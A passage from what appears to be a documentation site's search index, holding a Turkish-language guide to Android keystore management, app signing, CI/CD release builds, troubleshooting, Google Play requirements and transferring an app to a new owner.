enableV4Signing true  // Incremental installs (API 30+)\n        }\n    }\n}\n</code></pre> <p>[!NOTE] V3/V4 Signing:</p> <ul> <li><code>enableV3Signing</code>: Key rotation deste\u011fi (Android 9.0+)</li> <li><code>enableV4Signing</code>: Incremental updates (Android 11+)</li> <li>Her ikisi de performans art\u0131\u015f\u0131 sa\u011flar</li> </ul>"},{"location":"keystore%20copy/#8-version-yonetimi","title":"8. Version Y\u00f6netimi \ud83d\udcc8","text":""},{"location":"keystore%20copy/#81-androidappbuildgradle","title":"8.1. android/app/build.gradle","text":"<pre><code>android {\n    defaultConfig {\n        applicationId \"com.yourapp\"\n        minSdkVersion 21\n        targetSdkVersion 34  // Google Play minimum requirement (2024+)\n\n        // Version Code (her release'de art\u0131r\u0131n)\n        versionCode 1\n\n        // Version Name (kullan\u0131c\u0131ya g\u00f6sterilen)\n        versionName \"1.0.0\"\n    }\n}\n</code></pre> <p>[!WARNING] Target SDK Zorunlulu\u011fu: Google Play, her y\u0131l\u0131n sonuna do\u011fru yeni uygulamalar ve g\u00fcncellemeler i\u00e7in <code>targetSdkVersion</code>'\u0131 y\u00fckseltmeyi zorunlu k\u0131lar.</p> <ul> <li>2024: Minimum API 34 (Android 14)</li> <li>2025: Muhtemelen API 35</li> </ul> <p>Eski targetSdk ile uygulama g\u00fcncellenemez!</p>"},{"location":"keystore%20copy/#82-version-artrma-stratejisi","title":"8.2. Version Art\u0131rma Stratejisi","text":"<pre><code>versionCode: 1, 2, 3, 4, ... (her release'de +1)\nversionName: \"1.0.0\", \"1.0.1\", \"1.1.0\", \"2.0.0\" (semantic versioning)\n</code></pre> <p>\u00d6rnek:</p> <ul> <li><code>1.0.0</code> \u2192 <code>1.0.1</code> (bug fix)</li> <li><code>1.0.1</code> \u2192 <code>1.1.0</code> (yeni \u00f6zellik)</li> <li><code>1.1.0</code> \u2192 <code>2.0.0</code> (breaking change)</li> </ul>"},{"location":"keystore%20copy/#9-cicd-entegrasyonu","title":"9. CI/CD Entegrasyonu \ud83d\udd04","text":""},{"location":"keystore%20copy/#91-github-actions-ornegi","title":"9.1. GitHub Actions \u00d6rne\u011fi","text":"<pre><code># .github/workflows/android-release.yml\nname: Android Release\n\non:\n  push:\n    tags:\n      - \"v*\"\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up JDK\n        uses: actions/setup-java@v4\n        with:\n          java-version: \"17\"\n          distribution: \"temurin\"\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: \"20\"\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Decode Keystore\n        run: |\n          echo \"${{ secrets.KEYSTORE_BASE64 }}\" | base64 -d &gt; android/app/my-upload-key.keystore\n\n      - name: Create gradle.properties\n        run: |\n          echo \"MYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_ALIAS=${{ secrets.KEY_ALIAS }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_STORE_PASSWORD=${{ secrets.KEYSTORE_PASSWORD }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_PASSWORD=${{ secrets.KEY_PASSWORD }}\" &gt;&gt; android/gradle.properties\n\n      - name: Build AAB\n        run: |\n          cd android\n          ./gradlew bundleRelease\n\n      - name: Upload AAB\n        uses: actions/upload-artifact@v4\n        with:\n          name: app-release.aab\n          path: android/app/build/outputs/bundle/release/app-release.aab\n</code></pre>"},{"location":"keystore%20copy/#92-github-secrets-ekleme","title":"9.2. GitHub Secrets Ekleme","text":"<pre><code># Keystore'u base64'e \u00e7evir\nbase64 -i android/app/my-upload-key.keystore | pbcopy\n\n# GitHub &gt; Settings &gt; Secrets &gt; Actions &gt; New repository secret\n# KEYSTORE_BASE64: (paste)\n# KEY_ALIAS: my-key-alias\n# KEYSTORE_PASSWORD: your_password\n# KEY_PASSWORD: your_password\n</code></pre>"},{"location":"keystore%20copy/#10-troubleshooting","title":"10. Troubleshooting \ud83d\udd0d","text":""},{"location":"keystore%20copy/#101-yaygn-hatalar","title":"10.1. Yayg\u0131n Hatalar","text":"<p>Hata: \"Failed to read key\"</p> <pre><code># \u00c7\u00f6z\u00fcm: \u015eifreleri kontrol edin\nkeytool -list -v -keystore my-upload-key.keystore\n</code></pre> <p>Hata: \"Keystore was tampered with\"</p> <pre><code># \u00c7\u00f6z\u00fcm: Keystore bozulmu\u015f, yedekten geri y\u00fckleyin\n</code></pre> <p>Hata: \"Upload key not found\"</p> <pre><code># \u00c7\u00f6z\u00fcm: gradle.properties dosyas\u0131n\u0131 kontrol edin\ncat android/gradle.properties\n</code></pre>"},{"location":"keystore%20copy/#102-keystore-bilgilerini-goruntuleme","title":"10.2. Keystore Bilgilerini G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># Keystore i\u00e7eri\u011fini listele\nkeytool -list -v -keystore my-upload-key.keystore\n\n# Alias'lar\u0131 g\u00f6ster\nkeytool -list -keystore my-upload-key.keystore\n\n# Sertifika detaylar\u0131\nkeytool -list -v -keystore my-upload-key.keystore -alias my-key-alias\n</code></pre>"},{"location":"keystore%20copy/#11-checklist-production-release","title":"11. Checklist: Production Release \ud83d\udccb","text":"<ul> <li>[ ] Keystore olu\u015fturuldu ve g\u00fcvenli yerde sakland\u0131</li> <li>[ ] Keystore \u015fifreleri kaydedildi (password manager)</li> <li>[ ] <code>.gitignore</code>'a <code>*.keystore</code> eklendi</li> <li>[ ] <code>gradle.properties</code> konfig\u00fcre edildi</li> <li>[ ] <code>build.gradle</code> signing config eklendi</li> <li>[ ] <code>versionCode</code> ve <code>versionName</code> g\u00fcncellendi</li> <li>[ ] ProGuard/R8 aktif (<code>minifyEnabled true</code>)</li> <li>[ ] Release AAB/APK build edildi</li> <li>[ ] \u0130mza do\u011fruland\u0131 (<code>jarsigner -verify</code>)</li> <li>[ ] Test cihaz\u0131nda \u00e7al\u0131\u015ft\u0131r\u0131ld\u0131</li> <li>[ ] Google Play Console'da uygulama olu\u015fturuldu</li> <li>[ ] App Signing by Google Play aktif</li> <li>[ ] AAB upload edildi</li> <li>[ ] Release notes eklendi</li> </ul>"},{"location":"keystore%20copy/#12-guvenlik-best-practices","title":"12. G\u00fcvenlik Best Practices \ud83d\udd10","text":"<ol> <li>Keystore G\u00fcvenli\u011fi:</li> <li>Asla Git'e commit etmeyin</li> <li>Birden fazla yerde yedekleyin</li> <li> <p>\u015eifreli cloud storage kullan\u0131n</p> </li> <li> <p>\u015eifre Y\u00f6netimi:</p> </li> <li>G\u00fc\u00e7l\u00fc \u015fifreler kullan\u0131n (16+ karakter)</li> <li>Password manager kullan\u0131n</li> <li> <p>\u015eifreleri kimseyle payla\u015fmay\u0131n</p> </li> <li> <p>CI/CD:</p> </li> <li>Secrets'\u0131 environment variables olarak saklay\u0131n</li> <li>Base64 encode edin</li> <li> <p>Logs'da \u015fifreleri expose etmeyin</p> </li> <li> <p>Google Play App Signing:</p> </li> <li>Mutlaka aktif edin</li> <li>Upload key ile signing key ayr\u0131 olsun</li> <li>Keystore kayb\u0131 riskini minimize edin</li> </ol>"},{"location":"keystore%20copy/#13-eksik-kritik-konular","title":"13. Eksik Kritik Konular \u26a0\ufe0f","text":""},{"location":"keystore%20copy/#131-sha-256-fingerprint-firebasegoogle-services-icin","title":"13.1. SHA-256 Fingerprint (Firebase/Google Services \u0130\u00e7in)","text":"<p>Firebase, Google Sign-In, Google Maps kullan\u0131yorsan\u0131z mutlaka gerekli:</p> <pre><code># Release keystore'un SHA-256 fingerprint'ini al\u0131n\nkeytool -list -v -keystore android/app/my-upload-key.keystore -alias my-key-alias\n\n# \u00c7\u0131kt\u0131da \u015funu aray\u0131n:\n# SHA256: AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:...\n</code></pre> <p>Firebase Console'a Ekleme:</p> <ol> <li>Firebase Console \u2192 Project Settings \u2192 Your apps</li> <li>Android app se\u00e7in</li> <li>Add fingerprint \u2192 SHA-256'y\u0131 yap\u0131\u015ft\u0131r\u0131n</li> <li><code>google-services.json</code> dosyas\u0131n\u0131 yeniden indirin</li> <li><code>android/app/google-services.json</code> dosyas\u0131n\u0131 g\u00fcncelleyin</li> </ol> <p>[!IMPORTANT] Debug ve Release i\u00e7in ayr\u0131 fingerprint'ler:</p> <ul> <li>Debug: <code>~/.android/debug.keystore</code> (otomatik)</li> <li>Release: <code>my-upload-key.keystore</code> (sizin olu\u015fturdu\u011funuz)</li> </ul> <p>Her ikisini de Firebase'e eklemelisiniz!</p>"},{"location":"keystore%20copy/#132-64-bit-gereksinimi-2019dan-beri-zorunlu","title":"13.2. 64-bit Gereksinimi (2019'dan beri zorunlu)","text":"<p>Google Play, 64-bit deste\u011fi zorunlu k\u0131lm\u0131\u015ft\u0131r:</p> <p>android/app/build.gradle:</p> <pre><code>android {\n    defaultConfig {\n        ...\n        ndk {\n            abiFilters \"armeabi-v7a\", \"arm64-v8a\", \"x86\", \"x86_64\"\n        }\n    }\n\n    // Split APKs (\u00f6nerilen)\n    splits {\n        abi {\n            enable true\n            reset()\n            include \"armeabi-v7a\", \"arm64-v8a\"\n            universalApk false\n            enable gradle.startParameter.taskNames.any { it.contains(\"Release\") }\n        }\n    }\n}\n</code></pre> <p>Kontrol:</p> <pre><code># AAB i\u00e7eri\u011fini kontrol et\nunzip -l android/app/build/outputs/bundle/release/app-release.aab | grep \"lib/\"\n\n# \u015eunlar\u0131 g\u00f6rmeli:\n# lib/arm64-v8a/    \u2190 64-bit ARM (zorunlu!)\n# lib/armeabi-v7a/  \u2190 32-bit ARM\n</code></pre>"},{"location":"keystore%20copy/#133-internal-testing-track-ilk-upload-icin","title":"13.3. Internal Testing Track (\u0130lk Upload \u0130\u00e7in)","text":"<p>Production'a direkt y\u00fckleme yapmamal\u0131s\u0131n\u0131z!</p> <p>Do\u011fru S\u00fcre\u00e7:</p> <ol> <li>Internal Testing \u2192 Tak\u0131m i\u00e7i test (20 ki\u015fiye kadar)</li> <li>Closed Testing \u2192 Beta testerlar (s\u0131n\u0131rs\u0131z)</li> <li>Open Testing \u2192 Herkese a\u00e7\u0131k beta</li> <li>Production \u2192 Canl\u0131 yay\u0131n</li> </ol> <p>Internal Testing Kurulumu:</p> <pre><code>Play Console \u2192 Testing \u2192 Internal testing\n\u2192 Create new release\n\u2192 Upload AAB\n\u2192 Testers \u2192 Create email list\n\u2192 Add emails (max 100)\n\u2192 Save \u2192 Review release \u2192 Start rollout\n</code></pre> <p>Test Linki:</p> <pre><code>https://play.google.com/apps/internaltest/XXXXXXXX\n</code></pre>"},{"location":"keystore%20copy/#134-app-size-optimization","title":"13.4. App Size Optimization","text":"<p>AAB Boyutunu K\u00fc\u00e7\u00fcltme:</p> <pre><code>// android/app/build.gradle\nandroid {\n    buildTypes {\n        release {\n            // R8 full mode (daha agresif)\n            minifyEnabled true\n            shrinkResources true\n\n            // Proguard optimization\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n        }\n    }\n\n    // Unused resources'lar\u0131 kald\u0131r\n    packagingOptions {\n        exclude 'META-INF/*.kotlin_module'\n        exclude '**/kotlin/**'\n        exclude '**/*.txt'\n        exclude '**/*.version'\n        exclude '**/*.properties'\n    }\n}\n</code></pre> <p>Hermes Engine (React Native 0.70+):</p> <pre><code>// android/app/build.gradle\nproject.ext.react = [\n    enableHermes: true  // Varsay\u0131lan olarak true\n]\n</code></pre> <p>Boyut Analizi:</p> <pre><code># AAB boyutunu analiz et\nbundletool get-size total \\\n  --bundle=android/app/build/outputs/bundle/release/app-release.aab\n\n# APK boyutunu g\u00f6ster\nls -lh android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"keystore%20copy/#135-keystore-kayb-durumunda","title":"13.5. Keystore Kayb\u0131 Durumunda","text":"<p>E\u011fer keystore'u kaybettiyseniz:</p> <ol> <li>Google Play App Signing aktifse:</li> <li>\u2705 Upload key'i yenileyebilirsiniz</li> <li>Play Console \u2192 Setup \u2192 App signing \u2192 Request upload key reset</li> <li> <p>Google destek ekibi yard\u0131mc\u0131 olur</p> </li> <li> <p>Google Play App Signing aktif de\u011filse:</p> </li> <li>\u274c Uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Yeni bir uygulama olarak yay\u0131nlaman\u0131z gerekir</li> <li>T\u00fcm kullan\u0131c\u0131lar\u0131, yorumlar\u0131, indirmeleri kaybedersiniz</li> </ol> <p>[!CAUTION] Bu y\u00fczden Google Play App Signing MUTLAKA aktif olmal\u0131!</p>"},{"location":"keystore%20copy/#136-store-listing-gereksinimleri","title":"13.6. Store Listing Gereksinimleri","text":"<p>Minimum Gereksinimler:</p> <ul> <li>App icon: 512x512px (PNG, 32-bit)</li> <li>Feature graphic: 1024x500px</li> <li>Screenshots: En az 2 adet</li> <li>Phone: 320-3840px (16:9 veya 9:16)</li> <li>7-inch tablet: 1024-7680px</li> <li>10-inch tablet: 1024-7680px</li> </ul> <p>Privacy Policy:</p> <ul> <li>E\u011fer hassas veri topluyorsan\u0131z zorunlu</li> <li>URL olarak sa\u011flanmal\u0131</li> <li>GDPR/KVKK uyumlu olmal\u0131</li> </ul> <p>Content Rating:</p> <ul> <li>IARC anketi doldurulmal\u0131</li> <li>Ya\u015f s\u0131n\u0131r\u0131 belirlenir</li> <li>T\u00fcm \u00fclkeler i\u00e7in ge\u00e7erli</li> </ul>"},{"location":"keystore%20copy/#137-data-safety-form-zorunlu","title":"13.7. Data Safety Form (ZORUNLU!)","text":"<p>[!CAUTION] Google Play Console'da \"Data Safety\" formu doldurulmadan release olu\u015fturamazs\u0131n\u0131z!</p> <p>Nas\u0131l Doldurulur:</p> <ol> <li>Play Console \u2192 App content \u2192 Data safety</li> <li>Start \u2192 Anketi doldurun</li> </ol> <p>Dikkat Edilmesi Gerekenler:</p> <ul> <li>Firebase Analytics: Evet, veri topluyoruz</li> <li>AdMob: Evet, reklam ID topluyoruz</li> <li>Crash reporting: Evet, crash logs topluyoruz</li> </ul>"},{"location":"keystore%20copy/#138-api-33-yeni-gereksinimler-android-13","title":"13.8. API 33+ Yeni Gereksinimler (Android 13+)","text":"<p>[!IMPORTANT] targetSdkVersion 33+ kullan\u0131yorsan\u0131z yeni zorunluluklar var!</p> <p>1. Notification Permission (ZORUNLU):</p> <pre><code>&lt;!-- android/app/src/main/AndroidManifest.xml --&gt;\n&lt;manifest&gt;\n    &lt;uses-permission android:name=\"android.permission.POST_NOTIFICATIONS\"/&gt;\n    ...\n&lt;/manifest&gt;\n</code></pre> <p>React Native'de runtime permission:</p> <pre><code>import { PermissionsAndroid, Platform } from \"react-native\";\n\nasync function requestNotificationPermission() {\n  if (Platform.OS === \"android\" &amp;&amp; Platform.Version &gt;= 33) {\n    const granted = await PermissionsAndroid.request(\n      PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,\n    );\n    return granted === PermissionsAndroid.RESULTS.GRANTED;\n  }\n  return true;\n}\n</code></pre> <p>2. Foreground Service Types:</p> <pre><code>&lt;!-- E\u011fer foreground service kullan\u0131yorsan\u0131z --&gt;\n&lt;service\n    android:name=\".MyForegroundService\"\n    android:foregroundServiceType=\"location|camera|microphone\" /&gt;\n</code></pre> <p>[!WARNING] API 33+ i\u00e7in notification permission zorunlu. Eklemezsaniz bildirimler \u00e7al\u0131\u015fmaz!</p>"},{"location":"keystore%20copy/#14-ek-troubleshooting","title":"14. Ek Troubleshooting \ud83d\udd27","text":""},{"location":"keystore%20copy/#141-assetsgorseller-gorunmuyor","title":"14.1. Assets/G\u00f6rseller G\u00f6r\u00fcnm\u00fcyor","text":"<p>Sorun: Release APK'da g\u00f6rseller veya fontlar y\u00fcklenmiyor.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Manuel bundle olu\u015ftur\nnpx react-native bundle \\\n  --platform android \\\n  --dev false \\\n  --entry-file index.js \\\n  --bundle-output android/app/src/main/assets/index.android.bundle \\\n  --assets-dest android/app/src/main/res\n\n# Sonra build\ncd android &amp;&amp; ./gradlew assembleRelease\n</code></pre>"},{"location":"keystore%20copy/#142-install_failed_update_incompatible","title":"14.2. INSTALL_FAILED_UPDATE_INCOMPATIBLE","text":"<p>Sorun: Farkl\u0131 imza ile imzalanm\u0131\u015f eski uygulama y\u00fckl\u00fc.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Eski uygulamay\u0131 kald\u0131r\nadb uninstall com.yourapp\n\n# Yeni APK'y\u0131 y\u00fckle\nadb install android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"keystore%20copy/#143-execution-failed-for-task-appvalidatesigningrelease","title":"14.3. Execution failed for task ':app:validateSigningRelease'","text":"<p>Sorun: Keystore bulunam\u0131yor veya \u015fifre yanl\u0131\u015f.</p> <p>Kontrol:</p> <pre><code># Dosya var m\u0131?\nls -la android/app/my-upload-key.keystore\n\n# \u015eifre do\u011fru mu?\nkeytool -list -keystore android/app/my-upload-key.keystore\n\n# gradle.properties do\u011fru mu?\ncat ~/.gradle/gradle.properties\n</code></pre> <p>Yayg\u0131n Hata:</p> <pre><code># \u2705 DO\u011eRU\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\n\n# \u274c YANLI\u015e\nMYAPP_UPLOAD_STORE_FILE=android/app/my-upload-key.keystore\n</code></pre>"},{"location":"keystore%20copy/#144-install_parse_failed_no_certificates","title":"14.4. INSTALL_PARSE_FAILED_NO_CERTIFICATES","text":"<p>Sorun: APK imzalanmam\u0131\u015f.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code>apksigner verify --verbose app-release.apk\n</code></pre>"},{"location":"keystore%20copy/#15-hzl-referans","title":"15. H\u0131zl\u0131 Referans \ud83d\ude80","text":"Komut A\u00e7\u0131klama <code>./gradlew bundleRelease</code> AAB olu\u015ftur <code>./gradlew assembleRelease</code> APK olu\u015ftur <code>./gradlew clean</code> Cache temizle <code>keytool -list -v -keystore x.keystore</code> Keystore bilgisi <code>apksigner verify app.apk</code> \u0130mza do\u011frula <code>adb install app.apk</code> Cihaza y\u00fckle <p>Dosya Yollar\u0131:</p> <ul> <li>AAB: <code>android/app/build/outputs/bundle/release/app-release.aab</code></li> <li>APK: <code>android/app/build/outputs/apk/release/app-release.apk</code></li> </ul>"},{"location":"keystore%20copy/#16-final-checklist","title":"16. Final Checklist \ud83d\udccb","text":"<p>Release \u00d6ncesi:</p> <ul> <li>[ ] Keystore 3 yerde yedeklendi</li> <li>[ ] <code>targetSdkVersion</code> g\u00fcncel (2024: API 34)</li> <li>[ ] 64-bit support (<code>arm64-v8a</code>)</li> <li>[ ] V3/V4 signing aktif (<code>enableV3Signing</code>, <code>enableV4Signing</code>)</li> <li>[ ] API 33+ notification permission eklendi (gerekirse)</li> <li>[ ] \u0130mza do\u011fruland\u0131</li> <li>[ ] Ger\u00e7ek cihazda test edildi</li> </ul> <p>Google Play:</p> <ul> <li>[ ] App Signing MUTLAKA aktif (2025'te zorunlu!)</li> <li>[ ] Data Safety formu dolduruldu</li> <li>[ ] Internal testing yap\u0131ld\u0131</li> <li>[ ] SHA-256 Firebase'e eklendi (gerekirse)</li> </ul>"},{"location":"keystore%20copy/#17-uygulama-satsdevir-sureci","title":"17. Uygulama Sat\u0131\u015f\u0131/Devir S\u00fcreci \ud83d\udd04","text":""},{"location":"keystore%20copy/#171-keystore-nasl-uretiliyor","title":"17.1. Keystore Nas\u0131l \u00dcretiliyor?","text":"<p>[!NOTE] Keystore \u00fcreten ara\u00e7: <code>keytool</code></p> <ul> <li>Java JDK ile birlikte gelir (built-in)</li> <li>Ba\u015fka alternatif ara\u00e7 yok, bu resmi y\u00f6ntem</li> <li>Android Studio'da GUI var ama komut sat\u0131r\u0131 daha g\u00fcvenilir</li> </ul> <p>keytool Nedir?</p> <ul> <li>Java Development Kit (JDK) i\u00e7inde gelen bir komut sat\u0131r\u0131 arac\u0131</li> <li>Dijital sertifika ve keystore y\u00f6netimi i\u00e7in kullan\u0131l\u0131r</li> <li>T\u00fcm platformlarda ayn\u0131 \u015fekilde \u00e7al\u0131\u015f\u0131r (Windows, macOS, Linux)</li> </ul> <p>Kurulum:</p> <pre><code># JDK kurulu mu kontrol et\njava -version\nkeytool -version\n\n# Kurulu de\u011filse:\n# macOS: brew install openjdk@17\n# Windows: Oracle JDK veya Adoptium\n# Linux: sudo apt install openjdk-17-jdk\n</code></pre> <p>Android Studio GUI (Alternatif):</p> <ol> <li>Build \u2192 Generate Signed Bundle/APK</li> <li>Create new keystore</li> <li>Bilgileri doldur</li> <li>Keystore olu\u015fturulur</li> </ol> <p>[!TIP] Komut sat\u0131r\u0131 y\u00f6ntemi daha g\u00fcvenilir ve otomasyon i\u00e7in uygun!</p>"},{"location":"keystore%20copy/#172-uygulama-satsdevir-sureci","title":"17.2. Uygulama Sat\u0131\u015f\u0131/Devir S\u00fcreci","text":"<p>Senaryo: \"Expense Tracker\" uygulaman\u0131z\u0131 ba\u015fka bir geli\u015ftiriciye sat\u0131yorsunuz.</p>"},{"location":"keystore%20copy/#adm-1-keystore-transferi","title":"Ad\u0131m 1: Keystore Transferi","text":"<p>Verilmesi Gerekenler:</p> <pre><code># 1. Keystore dosyas\u0131\nexpense-tracker-upload-key.keystore\n\n# 2. Keystore bilgileri (g\u00fcvenli \u015fekilde payla\u015f)\nKeystore Password: ********\nKey Alias: expense-tracker-key\nKey Password: ********\n</code></pre> <p>G\u00fcvenli Transfer Y\u00f6ntemleri:</p> <pre><code># Se\u00e7enek 1: \u015eifreli ZIP\nzip -e keystore-package.zip expense-tracker-upload-key.keystore keystore-info.txt\n# \u015eifreyi ayr\u0131 kanaldan payla\u015f (SMS, telefon)\n\n# Se\u00e7enek 2: Password Manager\n# 1Password, Bitwarden gibi ara\u00e7larla g\u00fcvenli payla\u015f\u0131m\n\n# Se\u00e7enek 3: \u015eifreli Cloud Storage\n# Google Drive (\u015fifreli), Dropbox (\u015fifreli)\n</code></pre> <p>[!CAUTION] Asla email ile \u015fifresiz g\u00f6ndermeyin!</p>"},{"location":"keystore%20copy/#adm-2-google-play-console-transfer","title":"Ad\u0131m 2: Google Play Console Transfer","text":"<p>Play Console'da Transfer:</p> <ol> <li>Play Console \u2192 Settings \u2192 Developer account</li> <li>Transfer apps se\u00e7ene\u011fini bul</li> <li>Al\u0131c\u0131n\u0131n email adresini ekle</li> <li>Transfer iste\u011fi g\u00f6nder</li> <li>Al\u0131c\u0131 kabul eder</li> </ol> <p>Alternatif: Developer Account De\u011fi\u015fikli\u011fi</p> <p>E\u011fer tam devir yap\u0131lacaksa:</p> <ol> <li>Play Console \u2192 Users and permissions</li> <li>Yeni sahibi Admin olarak ekle</li> <li>Kendini kald\u0131r (veya yetkilerini d\u00fc\u015f\u00fcr)</li> </ol>"},{"location":"keystore%20copy/#adm-3-devir-sonras-kontrol-listesi","title":"Ad\u0131m 3: Devir Sonras\u0131 Kontrol Listesi","text":"<p>Al\u0131c\u0131n\u0131n Yapmas\u0131 Gerekenler:</p> <ul> <li>[ ] Keystore dosyas\u0131n\u0131 g\u00fcvenli yere kaydet</li> <li>[ ] \u015eifreleri password manager'a ekle</li> <li>[ ] Test build al (imza do\u011frula)</li> <li>[ ] Google Play Console eri\u015fimini kontrol et</li> <li>[ ] Firebase/Analytics hesaplar\u0131n\u0131 devral (gerekirse)</li> <li>[ ] App Store listing'i g\u00fcncelle (gerekirse)</li> </ul> <p>Sat\u0131c\u0131n\u0131n Yapmas\u0131 Gerekenler:</p> <ul> <li>[ ] Keystore'u yedekten sil (art\u0131k senin de\u011fil!)</li> <li>[ ] \u015eifreleri password manager'dan kald\u0131r</li> <li>[ ] Play Console eri\u015fimini kald\u0131r</li> <li>[ ] Firebase/Analytics eri\u015fimini kald\u0131r</li> <li>[ ] Kaynak kodunu devret (anla\u015fmaya g\u00f6re)</li> </ul>"},{"location":"keystore%20copy/#173-keystore-guvenligi-sats-oncesi","title":"17.3. Keystore G\u00fcvenli\u011fi (Sat\u0131\u015f \u00d6ncesi)","text":"<p>Sat\u0131\u015f \u00d6ncesi Haz\u0131rl\u0131k:</p> <pre><code># 1. Keystore bilgilerini dok\u00fcmante et\ncat &gt; transfer-package/README.txt &lt;&lt; EOF\nApp Name: Expense Tracker\nPackage: com.yourcompany.expensetracker\nKeystore File: expense-tracker-upload-key.keystore\nAlias: expense-tracker-key\nCreated: 2024-01-15\nLast Used: 2024-12-20\n\nIMPORTANT:\n- This keystore is CRITICAL for app updates\n- Store passwords in a password manager\n- Keep 3 backups in different locations\n- Never commit to Git\nEOF\n\n# 2. Keystore'u test et\nkeytool -list -v -keystore expense-tracker-upload-key.keystore\n\n# 3. Son bir release build al (do\u011frulama i\u00e7in)\ncd android &amp;&amp; ./gradlew bundleRelease\n</code></pre> <p>Transfer Paketi:</p> <pre><code>transfer-package/\n\u251c\u2500\u2500 expense-tracker-upload-key.keystore\n\u251c\u2500\u2500 keystore-info.txt (\u015fifreler)\n\u251c\u2500\u2500 README.txt (talimatlar)\n\u251c\u2500\u2500 last-release.aab (son build)\n\u2514\u2500\u2500 SHA-256-fingerprint.txt (Firebase i\u00e7in)\n</code></pre>"},{"location":"keystore%20copy/#174-yasal-hususlar","title":"17.4. Yasal Hususlar","text":"<p>[!WARNING] Sat\u0131\u015f S\u00f6zle\u015fmesinde Bulunmas\u0131 Gerekenler:</p> <ul> <li>Keystore'un m\u00fclkiyeti al\u0131c\u0131ya ge\u00e7er</li> <li>Sat\u0131c\u0131 keystore'u silmeyi taahh\u00fct eder</li> <li>Uygulama g\u00fcncellemelerini sadece al\u0131c\u0131 yapabilir</li> <li>Google Play Console eri\u015fimi devredilir</li> <li>Kaynak kodu devri (varsa)</li> </ul> <p>\u00d6rnek Madde:</p> <pre><code>\"Sat\u0131c\u0131, [App Name] uygulamas\u0131n\u0131n Android keystore dosyas\u0131n\u0131,\nilgili \u015fifreleri ve Google Play Console eri\u015fimini al\u0131c\u0131ya\ndevretmeyi kabul eder. Sat\u0131c\u0131, devir sonras\u0131 keystore'u\nsilmeyi ve uygulamay\u0131 g\u00fcncellememyi taahh\u00fct eder.\"\n</code></pre>"},{"location":"keystore%20copy/#18-kaynaklar","title":"18. Kaynaklar \ud83d\udcda","text":"<ul> <li>Android Developer - App Signing</li> <li>React Native - Publishing to Google Play</li> <li>Google Play Console</li> <li>bundletool</li> </ul> <p>\ud83d\udca1 Pro Tip: Keystore'unuzu kaybetmek, uygulaman\u0131z\u0131 kaybetmek demektir. Mutlaka yedekleyin!</p>"},{"location":"keystore/","title":"Android Keystore ve APK \u0130mzalama Rehberi","text":"<p>[!WARNING] Gizli D\u00f6k\u00fcman: Bu sayfa navigasyonda g\u00f6r\u00fcnmez. Sadece do\u011frudan URL ile eri\u015filebilir.</p> <p>G\u00fcvenlik Uyar\u0131s\u0131: Keystore dosyas\u0131 ve \u015fifreleri asla Git'e commit etmeyin!</p> <p>React Native Android uygulaman\u0131z\u0131 Google Play Store'a y\u00fcklemek i\u00e7in APK/AAB dosyas\u0131n\u0131 imzalaman\u0131z gerekir. Bu rehber t\u00fcm s\u00fcreci ad\u0131m ad\u0131m anlat\u0131r.</p>"},{"location":"keystore/#1-keystore-nedir","title":"1. Keystore Nedir? \ud83d\udd11","text":"<p>Keystore, Android uygulaman\u0131z\u0131 imzalamak i\u00e7in kullan\u0131lan dijital sertifika deposudur.</p> <p>\u00d6nemli Noktalar:</p> <ul> <li>Her uygulama benzersiz bir keystore ile imzalanmal\u0131d\u0131r</li> <li>Keystore kaybedilirse, uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Google Play, ayn\u0131 keystore ile imzalanm\u0131\u015f APK'lar\u0131 ayn\u0131 uygulama olarak tan\u0131r</li> <li>Keystore \u015fifresini unutmay\u0131n - kurtarma yolu yoktur!</li> </ul>"},{"location":"keystore/#11-tek-keystore-vs-coklu-keystore-cok-onemli","title":"1.1. Tek Keystore vs \u00c7oklu Keystore (\u00c7ok \u00d6nemli!) \ud83c\udfaf","text":"<p>[!CAUTION] Birden fazla uygulama geli\u015ftiriyorsan\u0131z:</p> <p>\u274c YANLI\u015e: T\u00fcm uygulamalar i\u00e7in ayn\u0131 keystore \u2705 DO\u011eRU: Her uygulama i\u00e7in ayr\u0131 keystore</p> <p>Neden Her Uygulama \u0130\u00e7in Ayr\u0131 Keystore?</p> Senaryo Tek Keystore \u00c7oklu Keystore G\u00fcvenlik \u274c Bir keystore s\u0131zarsa t\u00fcm uygulamalar risk alt\u0131nda \u2705 Sadece 1 uygulama etkilenir Uygulama Sat\u0131\u015f\u0131 \u274c Keystore'u payla\u015fmak zorunda kal\u0131rs\u0131n \u2705 Sadece o uygulaman\u0131n keystore'unu verirsin Organizasyon \u274c Hangi keystore hangi app'e ait belli de\u011fil \u2705 Her keystore a\u00e7\u0131k\u00e7a etiketli Keystore Kayb\u0131 \u274c T\u00fcm uygulamalar g\u00fcncelleme alamaz \u2705 Sadece 1 uygulama etkilenir <p>\u00d6nerilen \u0130simlendirme:</p> <pre><code># \u274c YANLI\u015e (genel isim)\nmy-upload-key.keystore\n\n# \u2705 DO\u011eRU (uygulama \u00f6zel)\nexpense-tracker-upload-key.keystore\ntodo-app-upload-key.keystore\nfitness-app-upload-key.keystore\n</code></pre> <p>Dosya Yap\u0131s\u0131 \u00d6rne\u011fi:</p> <pre><code>~/keystores/\n\u251c\u2500\u2500 expense-tracker/\n\u2502   \u251c\u2500\u2500 expense-tracker-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt  (\u015fifreler, 